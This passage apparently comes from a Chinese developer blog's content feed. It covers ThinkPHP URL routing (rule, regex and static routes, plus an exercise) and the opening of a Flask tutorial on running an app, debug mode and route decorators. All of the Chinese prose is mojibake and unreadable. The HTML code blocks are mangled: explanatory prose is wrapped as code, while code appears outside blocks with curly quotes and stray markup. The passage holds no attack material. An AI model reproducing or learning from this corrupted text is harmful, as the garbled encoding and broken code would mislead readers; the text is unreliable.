çš„URLæ”¯æŒPATH_INFOï¼ˆæˆ–è€…å…¼å®¹URLæ¨¡å¼ä¹Ÿå¯ä»¥ï¼Œé‡‡ç”¨æ™®é€šURLæ¨¡å¼çš„æƒ…å†µä¸‹ä¸æ”¯æŒè·¯ç”±åŠŸèƒ½ï¼‰å¹¶ä¸”ç¡®è®¤å·²å¼€å¯ä¸€ä¸‹çš„è·¯ç”±è®¾ç½®ï¼š<br><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'URL_ROUTER_ON'</span>   =&gt; <span class="keyword">true</span></span><br></pre></td></tr></table></figure></p><p>è¿™é‡Œæ¶‰åŠåˆ°ä¸¤ä¸ªè®¾ç½®é¡¹ï¼ŒPATH_INFOå’ŒURL_ROUTER_ONï¼Œè¿™äº›åœ¨ThinkPHP/Conf/convention.phpæ–‡ä»¶éƒ½å¯ä»¥æ‰¾åˆ°ã€‚ æ­¤å¤„è¾“å…¥å›¾ç‰‡çš„æè¿° æ­¤å¤„è¾“å…¥å›¾ç‰‡çš„æè¿°</p><p>åœ¨æ»¡è¶³ä»¥ä¸Šä¸¤ä¸ªæ¡ä»¶ä¹‹åï¼Œå°±å¯ä»¥é…ç½®è·¯ç”±è§„åˆ™äº†ã€‚åœ¨é…ç½®æ–‡ä»¶ä¸­ä½¿ç”¨URL_ROUTE_RULESå‚æ•°è¿›è¡Œé…ç½®ï¼Œé…ç½®æ ¼å¼æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå…¶æ ¼å¼ä¸ºï¼š â€˜è·¯ç”±è¡¨è¾¾å¼â€™=&gt;â€™è·¯ç”±åœ°å€å’Œä¼ å…¥å‚æ•°â€™æ¯ä¸ªå…ƒç´ éƒ½ä»£è¡¨ä¸€ä¸ªè·¯ç”±è§„åˆ™ï¼Œæ¯”å¦‚ï¼šåœ¨config.php æ·»åŠ é…ç½®é¡¹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'URL_ROUTE_RULES'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'blogs/:year/:month/:day'</span> =&gt; <span class="keyword">array</span>(<span class="string">'Index/archive'</span>, <span class="string">'status=1'</span>),</span><br><span class="line">    <span class="string">'blogs/:id'</span>               =&gt; <span class="string">'Index/read'</span>,</span><br><span class="line">),</span><br></pre></td></tr></table></figure></p><p>ThinkPHPæŒ‰å®šä¹‰çš„é¡ºåºä¾æ¬¡åŒ¹é…è·¯ç”±è§„åˆ™ï¼Œä¸€æ—¦åŒ¹é…åˆ°çš„è¯ï¼Œå°±ä¼šå®šä½åˆ°è·¯ç”±å®šä¹‰ä¸­çš„æ§åˆ¶å™¨å’Œæ“ä½œæ–¹æ³•å»æ‰§è¡Œï¼ˆä½ å¯ä»¥ä¼ å…¥å…¶ä»–çš„å‚æ•°ï¼‰ï¼Œè€Œåé¢çš„è§„åˆ™ä¸ä¼šç»§ç»­åŒ¹é…</p><p>ä»¥ä¸Šçš„è·¯ç”±é…ç½®è¯´æ˜ï¼šåœ¨æ¯ä¸ªè·¯ç”±è¡¨è¾¾å¼ä¸­ï¼Œ:åé¢è·Ÿå‚æ•°åç§°ï¼Œæ¯”å¦‚ä¸Šé¢çš„:year,:month,:idéƒ½æ˜¯å‚æ•°åç§°ï¼Œä»¥:idä¸ºä¾‹ï¼Œå®ƒæŒ‡å‘Indexæ§åˆ¶å™¨çš„readæ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•æ¥å—ä¸€ä¸ª$idçš„å‚æ•°ï¼š<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">($id)</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"read page with"</span> .$id;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>ä½ éœ€è¦åœ¨IndexControllerä¸­æ·»åŠ ä¸Šé¢çš„ä»£ç ï¼ŒIndexControllerä½äºApplication/Home/Controllerä¹‹ä¸‹</p><p>åœ¨æµè§ˆå™¨è¾“å…¥<a href="http://localhost:8999/index.php/Home/blogs/2å°±å¯ä»¥çœ‹åˆ°" target="_blank" rel="noopener">http://localhost:8999/index.php/Home/blogs/2å°±å¯ä»¥çœ‹åˆ°</a></p><p>Homeå°±ä»£è¡¨Homeæ¨¡å—ï¼Œä½ å¯ä»¥ç®€å•åœ°å°†å®ƒæ˜ å°„åˆ°ç›¸åº”çš„Homeç›®å½•ï¼Œè¿™æ˜¯ç”±äºåœ¨é»˜è®¤çš„é…ç½®ä¸­<br><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'DEFAULT_MODULE'</span>        =&gt;  <span class="string">'Home'</span></span><br></pre></td></tr></table></figure></p><p>ä½ å¯ä»¥æ ¹æ®è‡ªå·±çš„éœ€æ±‚ä¿®æ”¹ï¼Œä½†æœ¬è¯¾ä¾æ—§é‡‡ç”¨é»˜è®¤çš„Homeæ¨¡å—.</p><p>å¦‚æœä½ è¿˜éœ€è¦ä¼ å…¥é¢å¤–çš„å‚æ•°ï¼Œåƒç¬¬ä¸€æ¡çš„è§„åˆ™array(â€˜Index/archiveâ€™, â€˜status=1â€™)ä¸­çš„statusä¸€æ ·ä¼ å…¥ï¼Œä½ çœ‹è®¾ç½®å¤šä¸ªè¿™æ ·çš„å‚æ•°ã€‚</p><p>å¦‚æœä½ å°è¯•åœ¨æµè§ˆå™¨è¾“å…¥ï¼š</p><p><a href="http://localhost:8999/index.php/Home/blogs/string" target="_blank" rel="noopener">http://localhost:8999/index.php/Home/blogs/string</a></p><p>ThinkPHPä¹Ÿç»™æˆ‘ä»¬è¿”å›äº†stringï¼Œä½†åœ¨æ—¥å¸¸çš„å¼€å‘ä¸­ï¼Œæˆ‘ä»¬é€šå¸¸éœ€è¦é™åˆ¶:idå˜é‡æ˜¯æ•´æ•°ï¼Œé‚£è¯¥æ€ä¹ˆåšå‘¢ï¼Ÿåªéœ€è¦ç¨ç¨æ”¹åŠ¨å°±å¯ä»¥äº†ï¼Œå†™æˆ<br><figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">'blogs</span>/:id\d'               =&gt; <span class="symbol">'Index</span>/read',</span><br></pre></td></tr></table></figure></p><p>ä»¥ä¸Š\dè¡¨ç¤ºé™åˆ¶å˜é‡idåªèƒ½æ˜¯æ•°å­—ã€‚</p><p>å¯¹äºå¯é€‰å‚æ•°ï¼Œå¯ä»¥ç”¨[]åŒ…å«è¡¨ç¤ºï¼Œæ¯”å¦‚ï¼š</p><p>â€˜blogs/:year/:month/[:day]â€™ =&gt; array(â€˜Index/archiveâ€™, â€˜status=1â€™),<br>ä¸Šé¢çš„dayç°åœ¨å°±æ˜¯å¯é€‰å‚æ•°äº†ï¼Œä½ å¯ä»¥ä¼ å…¥ï¼Œä¹Ÿå¯ä»¥ä¸ä¼ ã€‚</p><p>åœ¨ThinkPHPä¸­ï¼Œè¿˜æ”¯æŒåœ¨é™åˆ¶è·¯ç”±çš„åç¼€å’Œä½¿ç”¨æ­£åˆ™è·¯ç”±ã€‚</p><p>é™åˆ¶è·¯ç”±åç¼€ï¼Œé€šå¸¸ä½¿ç”¨åœ¨å¹³æ—¶å¸¸è§çš„html,htmç­‰åç¼€ï¼Œè¿˜æ˜¯ä»¥ä¸Šé¢çš„è§„åˆ™ä¸ºä¾‹ï¼š</p><p>â€˜blogs/:idâ€™               =&gt; array(â€˜Index/readâ€™,array(â€˜extâ€™=&gt;â€™htmlâ€™))<br>ä½ å°±å¯ä»¥é™åˆ¶è¿™æ¡è§„åˆ™åªèƒ½åœ¨.htmlçš„è·¯ç”±åç¼€ç”Ÿæ•ˆã€‚</p><p>2.2 æ­£åˆ™è·¯ç”±<br>æ­£åˆ™æœ¬èº«å°±æ˜¯ä¸€é—¨å¾ˆå¤§çš„å­¦é—®ï¼Œåœ¨å­¦ä¹ ThinkPHPçš„æ­£åˆ™è·¯ç”±ä¹‹å‰ï¼Œæœ€å¥½æ˜¯å…·å¤‡ä¸€å®šçš„æ­£åˆ™è¡¨è¾¾å¼çš„åŸºç¡€ã€‚</p><p>è·¯ç”±è¡¨è¾¾å¼æ”¯æŒçš„æ­£åˆ™å®šä¹‰å¿…é¡»ä»¥/å¼€å¤´ï¼Œå¦åˆ™å°±è§†ä¸ºè§„åˆ™è¡¨è¾¾å¼ï¼Œæ¯”å¦‚ï¼š</p><p>â€˜#^blog\/(\d+)$#â€™ =&gt; â€˜Index/readâ€™<br>è¿™ä¼šè§£æä¸ºè§„åˆ™è·¯ç”±è€Œä¸æ˜¯æ­£åˆ™è·¯ç”±ï¼Œå› ä¸ºè·¯ç”±è¡¨è¾¾å¼å¹¶æ²¡æœ‰ä»¥/å¼€å§‹ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬éœ€è¦è¿™æ ·å†™ï¼š</p><p>â€˜/^new\/(\d{4})\/(\d{2})$/â€˜ =&gt; â€˜Index/achive?year=:1&amp;month=:2â€™,<br>ä»¥ä¸Šå°±æ˜¯ä¸€æ¡æ­£ç¡®çš„æ­£åˆ™è·¯ç”±ã€‚å¯¹äºæ­£åˆ™è¡¨è¾¾å¼ä¸­çš„æ¯ä¸ªæ­£åˆ™è§„åˆ™å­æ¨¡å¼ï¼‰éƒ¨åˆ†(å¦‚\d{4}å’Œ\d{2})ï¼Œå¦‚æœéœ€è¦åœ¨åé¢çš„è·¯ç”±åœ°å€ä¸­å¼•ç”¨ï¼Œå¯ä»¥é‡‡ç”¨:1ã€:2è¿™æ ·çš„æ–¹å¼ï¼Œåºå·å°±æ˜¯å­æ¨¡å¼çš„åºå·</p><p>2.3 é™æ€è·¯ç”±<br>ThinkPHPæ¡†æ¶å…¶å®è¿˜æœ‰ä¸€ä¸ªè·¯ç”±æœºåˆ¶å«é™æ€è·¯ç”±ï¼Œè¿™å®é™…ä¸Šå°±æ˜¯è§„åˆ™è·¯ç”±çš„é™æ€ç®€åŒ–ç‰ˆï¼Œè·¯ç”±å®šä¹‰ä¸­ä¸åŒ…å«åŠ¨æ€å‚æ•°(å¦‚ä¸Šé¢çš„è·¯ç”±è§„åˆ™ä¸­idå‚æ•°)ï¼Œé™æ€è·¯ç”±ä¸éœ€è¦éå†è·¯ç”±è§„åˆ™è€Œæ˜¯ç›´æ¥å®šä½ï¼Œå› æ­¤æ‰§è¡Œæ•ˆç‡ä¼šè¾ƒé«˜ã€‚é™æ€è·¯ç”±é‡‡ç”¨URL_MAP_RULESæ¥å®šä¹‰è§„åˆ™ï¼š</p><p>â€˜URL_ROUTER_ONâ€™   =&gt; true,<br>â€˜URL_MAP_RULESâ€™=&gt;array(<br>    â€˜new/topâ€™ =&gt; â€˜Index/top?type=topâ€™<br>)</p><p>ç”±äºIndex/top?type=topä¸­Indexè¡¨ç¤ºæ§åˆ¶å™¨ï¼Œç¬¬ä¸€ä¸ªtopè¡¨ç¤ºæ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨Indexæ§åˆ¶å™¨ä¸­åˆ›å»ºtop()æ–¹æ³•ï¼š</p><p>public function top(){<br>        echo â€œtop page <br>â€œ;<br>    }</p><p>ä½ éœ€è¦åœ¨IndexControllerä¸­æ·»åŠ ä¸Šé¢çš„ä»£ç ï¼ŒIndexControllerä½äºApplication/Home/Controllerä¹‹ä¸‹</p><p>æ ¹æ®ä¸Šé¢è¿™æ¡è§„åˆ™ï¼Œå¦‚æœæˆ‘ä»¬è®¿é—®åˆ°</p><p><a href="http://localhost:8999/index.php/Home/new/top" target="_blank" rel="noopener">http://localhost:8999/index.php/Home/new/top</a></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1d7k1f0n1j30gn05x3yw.jpg" alt=""></p><p>å…¶å®æˆ‘ä»¬è®¿é—®çš„æ˜¯ï¼š</p><p><a href="http://localhost:8999/index.php/Home/index/top/type/top" target="_blank" rel="noopener">http://localhost:8999/index.php/Home/index/top/type/top</a><br>è½¬è¯‘æˆå°±æ˜¯new/topå¯¹åº”çš„æ˜¯Indexæ§åˆ¶å™¨çš„top()æ–¹æ³•ï¼Œä¼ äººçš„å‚æ•°ä¸ºtypeï¼Œå‚æ•°å€¼ä¸ºtopï¼Œæ‰€ä»¥å°±æœ‰äº†index/top/type/top</p><p>ä½†æ˜¯ï¼Œå½“æˆ‘ä»¬è®¿é—®<a href="http://localhost:8999/index.php/Home/new/top/var/testå°½ç®¡URLåœ°å€å‰é¢ä¹Ÿæœ‰new/topï¼Œç„¶è€Œç”±äºé™æ€è·¯ç”±æ˜¯å®Œæ•´åŒ¹é…çš„æ€§è´¨ï¼Œæ‰€ä»¥ä¸ä¼šåŒ¹é…åˆ°index/top/type/top" target="_blank" rel="noopener">http://localhost:8999/index.php/Home/new/top/var/testå°½ç®¡URLåœ°å€å‰é¢ä¹Ÿæœ‰new/topï¼Œç„¶è€Œç”±äºé™æ€è·¯ç”±æ˜¯å®Œæ•´åŒ¹é…çš„æ€§è´¨ï¼Œæ‰€ä»¥ä¸ä¼šåŒ¹é…åˆ°index/top/type/top</a></p><h2 id="è¯¾åä¹ é¢˜-1"><a href="#è¯¾åä¹ é¢˜-1" class="headerlink" title="è¯¾åä¹ é¢˜"></a>è¯¾åä¹ é¢˜</h2><figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">'URL_ROUTER_ON'</span>   =&gt; <span class="literal">true</span>,</span><br><span class="line"><span class="symbol">'URL_ROUTE_RULES'</span> =&gt; <span class="built_in">array</span>(</span><br><span class="line">    <span class="symbol">'new</span>/:id\d'    =&gt; <span class="symbol">'Index</span>/read',</span><br><span class="line">    <span class="symbol">'new</span>/:name'    =&gt; <span class="symbol">'Index</span>/read',</span><br><span class="line">),</span><br></pre></td></tr></table></figure><p>åœ¨è·¯ç”±é…ç½®å¦‚ä¸Šçš„æƒ…å†µä¸‹ï¼Œä¿®æ”¹IndexControllerçš„read()æ–¹æ³•ï¼Œä½¿å¾—read()æ–¹æ³•ä¸å†ç»‘å®šå‚æ•°ï¼Œä½¿ç”¨$_GETæ–¹å¼å®ç°è®¿é—®ä¸‹é¢çš„ä¸¤ä¸ªåœ°å€éƒ½å¯ä»¥æ­£ç¡®è·å–ç›¸åº”çš„è¿”å›ç»“æœï¼š</p><p><a href="http://localhost:8999/index.php/Home/new/8" target="_blank" rel="noopener">http://localhost:8999/index.php/Home/new/8</a><br><a href="http://localhost:8999/index.php/Home/new/hello" target="_blank" rel="noopener">http://localhost:8999/index.php/Home/new/hello</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> å¼€å‘ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>flaskæ¡†æ¶å­¦ä¹ </title>
      <link href="/2019/03/23/flask%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/03/23/flask%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><h1 id="flaskè¿è¡ŒåŠè°ƒè¯•"><a href="#flaskè¿è¡ŒåŠè°ƒè¯•" class="headerlink" title="flaskè¿è¡ŒåŠè°ƒè¯•"></a>flaskè¿è¡ŒåŠè°ƒè¯•</h1><h2 id="WSGIä»‹ç»"><a href="#WSGIä»‹ç»" class="headerlink" title="WSGIä»‹ç»"></a>WSGIä»‹ç»</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>blog.csdn.net<span class="regexp">/on_1y/</span>article<span class="regexp">/details/</span><span class="number">18803563</span></span><br></pre></td></tr></table></figure><h2 id="ä¸€ä¸ªæœ€å°çš„åº”ç”¨"><a href="#ä¸€ä¸ªæœ€å°çš„åº”ç”¨" class="headerlink" title="ä¸€ä¸ªæœ€å°çš„åº”ç”¨"></a>ä¸€ä¸ªæœ€å°çš„åº”ç”¨</h2><p>ä¸€ä¸ªæœ€å°çš„åº”ç”¨çœ‹èµ·æ¥åƒè¿™æ ·ï¼Œæ–°å»º hello.py æ–‡ä»¶ï¼Œå¹¶å‘å…¶ä¸­å†™å…¥å¦‚ä¸‹ä»£ç ï¼š<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello, World!'</span></span><br></pre></td></tr></table></figure></p><p>é‚£ä¹ˆè¿™æ®µä»£ç åšäº†ä»€ä¹ˆï¼Ÿ</p><p>é¦–å…ˆæˆ‘ä»¬å¯¼å…¥äº†ç±» Flaskã€‚è¿™ä¸ªç±»çš„å®ä¾‹åŒ–å°†ä¼šæ˜¯æˆ‘ä»¬çš„ WSGI åº”ç”¨ã€‚<br>æ¥ç€ï¼Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªè¯¥ç±»çš„å®ä¾‹ã€‚ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯åº”ç”¨æ¨¡å—æˆ–åŒ…çš„åç§°ï¼Œè¿™æ · Flask æ‰ä¼šçŸ¥é“å»å“ªé‡Œå¯»æ‰¾æ¨¡æ¿ã€é™æ€æ–‡ä»¶ç­‰ç­‰ã€‚å¦‚æœä½ ä½¿ç”¨çš„æ˜¯å•ä¸€çš„æ¨¡å—ï¼ˆå°±å¦‚æœ¬ä¾‹ï¼‰ï¼Œç¬¬ä¸€ä¸ªå‚æ•°åº”è¯¥ä½¿ç”¨ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">æˆ‘ä»¬ä½¿ç”¨è£…é¥°å™¨route()å‘Šè¯‰ Flask å“ªä¸ªURLæ‰èƒ½è§¦å‘æˆ‘ä»¬çš„å‡½æ•°ã€‚</span><br><span class="line">å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œè¯¥å‡½æ•°åä¹Ÿæ˜¯ç”¨æ¥ç»™ç‰¹å®šå‡½æ•°ç”Ÿæˆ URLsï¼Œå¹¶ä¸”è¿”å›æˆ‘ä»¬æƒ³è¦æ˜¾ç¤ºåœ¨ç”¨æˆ·æµè§ˆå™¨ä¸Šçš„ä¿¡æ¯ã€‚</span><br><span class="line">ä½¿ç”¨ Python è§£é‡Šå™¨è¿è¡Œè¿™ä¸ªæ–‡ä»¶ï¼Œæ³¨æ„è¿™ä¸ªæ–‡ä»¶ä¸èƒ½å–åä¸ºflask.pyï¼Œå› ä¸ºè¿™ä¼šä¸ Flask æœ¬èº«å†²çªã€‚</span><br><span class="line"></span><br><span class="line">è¿è¡Œè¿™ä¸ªåº”ç”¨æ—¢å¯ä»¥ä½¿ç”¨ flask å‘½ä»¤è¡Œä¹Ÿå¯ä»¥ä½¿ç”¨ Python çš„ -m è°ƒç”¨ flaskï¼Œåœ¨è¿è¡Œä¹‹å‰ä½ éœ€è¦è®¾ç½® FLASK_APP çš„ç¯å¢ƒå˜é‡æ¥å‘Šè¯‰ç»ˆç«¯éœ€è¦è¿è¡Œå“ªä¸ªåº”ç”¨ï¼Œåœ¨ç»ˆç«¯æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š</span><br></pre></td></tr></table></figure></p><p>export FLASK_APP=hello.py<br>flask run<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ç°åœ¨ä½¿ç”¨æµè§ˆå™¨æµè§ˆhttp://<span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span>:<span class="number">5000</span>/ï¼Œå°†ä¼šçœ‹åˆ°é¡µé¢ä¸Šçš„ Hello, World!ã€‚</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">å½“ä½ è¿è¡ŒæœåŠ¡å™¨ï¼Œä½ ä¼šæ³¨æ„åˆ°å®ƒåªèƒ½ä»ä½ è‡ªå·±çš„è®¡ç®—æœºä¸Šè®¿é—®ï¼Œç½‘ç»œä¸­å…¶å®ƒä»»ä½•çš„åœ°æ–¹éƒ½ä¸èƒ½è®¿é—®ã€‚è¿™æ˜¯å› ä¸ºé»˜è®¤æƒ…å†µä¸‹æ˜¯ debug æ¨¡å¼ï¼Œåªæœ‰åº”ç”¨ä¸­çš„ä¸€ä¸ªç”¨æˆ·å¯ä»¥æ‰§è¡Œä½ è®¡ç®—æœºä¸Šçš„ä»»æ„ Python ä»£ç ã€‚</span><br><span class="line"></span><br><span class="line">å¦‚æœä½ å…³é—­ debug æˆ–è€…ä¿¡ä»»ä½ æ‰€åœ¨ç½‘ç»œä¸Šçš„ç”¨æˆ·ï¼Œå¯ä»¥è®©ä½ çš„æœåŠ¡å™¨å¯¹å¤–å…¬å¼€å¯ç”¨ï¼Œåªéœ€è¦åœ¨å‘½ä»¤è¡Œä¸­æ·»åŠ å‚æ•° --host=<span class="number">0.0</span><span class="meta">.0</span><span class="meta">.0</span>:</span><br></pre></td></tr></table></figure></p><p>flask run â€“host=0.0.0.0</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">è¿™è®©ä½ çš„æ“ä½œç³»ç»Ÿå»ç›‘å¬æ‰€æœ‰å…¬å¼€çš„ IPã€‚</span><br><span class="line"></span><br><span class="line">è°ƒè¯•æ¨¡å¼</span><br><span class="line">ä½¿ç”¨ flask å‘½ä»¤è¡Œå¯ä»¥éå¸¸æ–¹ä¾¿çš„å¯åŠ¨ä¸€ä¸ªæœ¬åœ°å¼€å‘æœåŠ¡å™¨ï¼Œä½†æ˜¯æ¯æ¬¡ä¿®æ”¹ä»£ç åä½ éƒ½éœ€è¦æ‰‹åŠ¨é‡å¯æœåŠ¡å™¨ã€‚é€šè¿‡å‰é¢çš„å¯åŠ¨åè¾“å‡ºæ˜¾ç¤ºå¯ä»¥å‘ç° <span class="keyword">Environment</span> ä¸º productionï¼ŒåŒæ—¶è°ƒè¯•æ¨¡å¼æœªå¼€å¯ <span class="keyword">Debug</span> mode: offã€‚</span><br><span class="line"></span><br><span class="line">è¿™æ ·åšå¹¶ä¸å¥½ï¼ŒFlask èƒ½åšå¾—æ›´å¥½ã€‚å¦‚æœå¯ç”¨äº†è°ƒè¯•æ”¯æŒï¼Œåœ¨ä»£ç ä¿®æ”¹åæœåŠ¡å™¨èƒ½å¤Ÿè‡ªåŠ¨é‡è½½ï¼Œå¹¶ä¸”å¦‚æœå‘ç”Ÿé”™è¯¯ï¼Œå®ƒä¼šæä¾›ä¸€ä¸ªæœ‰ç”¨çš„è°ƒè¯•å™¨ã€‚</span><br><span class="line"></span><br><span class="line">ä¸ºäº†è®©æ‰€æœ‰çš„å¼€å‘è€…ç‰¹å¾å¯ç”¨ï¼ˆåŒ…æ‹¬è°ƒè¯•æ¨¡å¼ï¼‰ï¼Œåœ¨è¿è¡ŒæœåŠ¡å™¨ä¹‹å‰å¯ä»¥è®¾ç½® FLASK_ENV ç¯å¢ƒå˜é‡ä¸º developmentï¼š</span><br></pre></td></tr></table></figure><p>$ export FLASK_ENV=development<br>$ export FLASK_DEBUG=1<br>$ flask run<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ä¸Šè¿°å‘½ä»¤åšäº†ä»¥ä¸‹å‡ ä»¶äº‹ï¼š</span><br><span class="line"></span><br><span class="line">ä½¿è°ƒè¯•å™¨ï¼ˆdebuggerï¼‰å¯ç”¨</span><br><span class="line">å¯åŠ¨äº†ä»£ç æ”¹å˜è‡ªåŠ¨çš„çƒ­åŠ è½½</span><br><span class="line">åœ¨ flask åº”ç”¨ä¸­å¼€å¯äº† <span class="builtin-name">debug</span> æ¨¡å¼</span><br><span class="line">æ³¨æ„</span><br><span class="line">å°½ç®¡äº¤äº’å¼è°ƒè¯•å™¨(debugger)ä¸èƒ½åœ¨åˆ†å‰(forking)ç¯å¢ƒä¸‹å·¥ä½œ(è¿™ä½¿å¾—å®ƒå‡ ä¹ä¸å¯èƒ½åœ¨ç”Ÿäº§æœåŠ¡å™¨ä¸Šä½¿ç”¨)ï¼Œå®ƒä¾ç„¶å…è®¸æ‰§è¡Œä»»æ„ä»£ç ã€‚è¿™ä½¿å®ƒæˆä¸ºä¸€ä¸ªå·¨å¤§çš„å®‰å…¨é£é™©ï¼Œå› æ­¤å®ƒç»å¯¹ä¸èƒ½ç”¨äºç”Ÿäº§ç¯å¢ƒã€‚</span><br><span class="line"></span><br><span class="line">è¿è¡Œä¸­çš„è°ƒè¯•å™¨çš„æˆªå›¾ï¼Œä»æˆªå›¾å¯ä»¥çœ‹å‡ºåœ¨é¡µé¢ä¸Šæœ‰ç»ˆç«¯å¯ä»¥æ‰§è¡Œäº¤äº’å¼å‘½ä»¤:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># è·¯ç”±</span></span><br><span class="line">route è£…é¥°å™¨æ˜¯ç”¨äºæŠŠä¸€ä¸ªå‡½æ•°ç»‘å®šåˆ°ä¸€ä¸ª URL ä¸Šã€‚</span><br></pre></td></tr></table></figure></p><p>from flask import Flask<br>app = Flask(<strong>name</strong>)</p><p> å¦‚æœè®¿é—® /,è¿”å› Index Page<br>@app.route(â€˜/â€˜)<br>def index():<br>    return â€˜Index Pageâ€™</p><p> å¦‚æœè®¿é—® /helloï¼Œè¿”å› Hello, World!<br>@app.route(â€˜/helloâ€™)<br>def hello():<br>    return â€˜Hello, World!â€™<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">è®¿é—®åœ°å€ <span class="string">http:</span><span class="comment">//127.0.0.1:5000ï¼Œæµè§ˆå™¨é¡µé¢ä¼šæ˜¾ç¤º Index Pageï¼›</span></span><br><span class="line">å¦‚æœè®¿é—®åœ°å€ <span class="string">http:</span><span class="comment">//127.0.0.1:5000/helloï¼Œæµè§ˆå™¨é¡µé¢ä¼šæ˜¾ç¤º Hello, World!ã€‚è¿™æ ·å°±å®ç°äº†é€šè¿‡è®¿é—®ä¸åŒçš„ URL åœ°å€ä»è€Œå“åº”ä¸åŒçš„é¡µé¢ã€‚</span></span><br><span class="line">ä¸ºäº†ç»™ URL å¢åŠ å˜é‡çš„éƒ¨åˆ†ï¼Œä½ éœ€è¦æŠŠä¸€äº›ç‰¹å®šçš„å­—æ®µæ ‡è®°æˆ&lt;variable_name&gt;ã€‚è¿™äº›ç‰¹å®šçš„å­—æ®µå°†ä½œä¸ºå‚æ•°ä¼ å…¥åˆ°ä½ çš„å‡½æ•°ä¸­ã€‚å½“ç„¶ä¹Ÿå¯ä»¥æŒ‡å®šä¸€ä¸ªå¯é€‰çš„è½¬æ¢å™¨é€šè¿‡è§„åˆ™&lt;<span class="string">converter:</span>variable_name&gt;å°†å˜é‡å€¼è½¬æ¢ä¸ºç‰¹å®šçš„æ•°æ®ç±»å‹ã€‚</span><br><span class="line">åœ¨ <span class="regexp">/home/</span>shiyanlou<span class="regexp">/Code/</span>hello.py æ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹çš„ä»£ç ï¼š</span><br></pre></td></tr></table></figure></p><p>@app.route(â€˜/user/<username>â€˜)<br>def show_user_profile(username):<br>     æ˜¾ç¤ºç”¨æˆ·å<br>    return â€˜User &#123;&#125;â€™.format(username)</username></p><p>@app.route(â€˜/post/<a href="int:post_id" target="_blank" rel="noopener">int:post_id</a>â€˜)<br>def show_post(post_id):<br>     æ˜¾ç¤ºæäº¤æ•´å‹çš„ç”¨æˆ·â€idâ€çš„ç»“æœï¼Œæ³¨æ„â€intâ€æ˜¯å°†è¾“å…¥çš„å­—ç¬¦ä¸²å½¢å¼è½¬æ¢ä¸ºæ•´å‹æ•°æ®<br>    return â€˜Post &#123;&#125;â€™.format(post_id)</p><p>@app.route(â€˜/path/<a href="path:subpath" target="_blank" rel="noopener">path:subpath</a>â€˜)<br>def show_subpath(subpath):<br>     æ˜¾ç¤º /path/ ä¹‹åçš„è·¯å¾„å<br>    return 